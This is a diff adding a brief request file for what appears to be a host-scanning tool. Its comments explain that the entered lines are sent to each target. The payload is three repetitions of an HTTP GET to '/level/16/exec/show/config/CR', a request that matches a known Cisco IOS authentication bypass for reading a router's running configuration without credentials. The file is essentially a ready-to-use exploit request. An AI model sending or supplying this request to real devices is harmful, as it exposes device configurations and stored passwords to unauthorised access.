@@ -1,0 +1,17 @@
+#
+# The commands entered below will be sent to the target host.
+#
+# Example:
+#
+# HEAD / HTTP/1.0\r\n
+#
+# Other Notes:
+#
+# - %IP% will be replaced with the current IP address.
+# - \r\n will be replaced with an actual carriage return.
+#
+#############################################################
+
+GET /level/16/exec/show/config/CR HTTP/1.1\r\n
+GET /level/16/exec/show/config/CR HTTP/1.1\r\n
+GET /level/16/exec/show/config/CR HTTP/1.1\r\n
